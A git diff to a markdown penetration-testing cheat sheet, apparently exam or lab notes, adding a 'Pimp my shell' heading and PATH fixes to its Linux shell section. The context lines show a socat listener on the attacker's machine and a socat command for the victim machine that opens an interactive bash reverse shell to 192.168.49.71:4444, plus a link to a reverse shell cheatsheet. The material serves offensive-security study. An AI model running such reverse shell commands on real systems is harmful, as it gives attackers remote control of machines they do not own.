@@ -422,6 +422,7 @@ dir /s /p proof.txt
 
 ## Shell <img src="https://cdn-icons-png.flaticon.com/512/5756/5756857.png" width="40" height="40" />
 ### Linux
+#### Pimp my shell
 ````
 which python
 which python2
@@ -433,6 +434,15 @@ which socat
 socat file:`tty`,raw,echo=0 tcp-listen:4444 #On Kali Machine
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.49.71:4444 #On Victim Machine
 ````
+````
+Command 'ls' is available in '/bin/ls'
+export PATH=$PATH:/bin
+````
+````
+The command could not be located because '/usr/bin' is not included in the PATH environment variable.
+export PATH=$PATH:/usr/bin
+````
+
 ````
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 ````
